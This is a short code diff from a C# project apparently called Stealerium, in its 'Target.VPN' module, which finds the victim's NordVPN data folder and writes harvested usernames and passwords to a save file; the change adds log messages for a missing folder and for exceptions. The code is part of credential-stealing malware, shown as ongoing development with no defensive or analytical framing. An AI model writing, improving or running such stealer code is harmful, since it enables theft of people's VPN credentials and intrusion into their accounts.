@@ -29,8 +29,11 @@ namespace Stealerium.Target.VPN
             var vpn = new DirectoryInfo(Path.Combine(Paths.Lappdata, "NordVPN"));
             // Stop if not exists
             if (!vpn.Exists)
+            {
+                Logging.Log($"Nord VPN >> Not Exist!\n");
                 return;
-
+            }
+                
             try
             {
                 Directory.CreateDirectory(sSavePath);
@@ -59,9 +62,9 @@ namespace Stealerium.Target.VPN
                         $"Username: {username}\nPassword: {password}\n\n");
                 }
             }
-            catch
+            catch(Exception ex)
             {
-                // ignored
+                Logging.Log($"Nord VPN >> Exception : {ex.Message}!\n");
             }
         }
     }
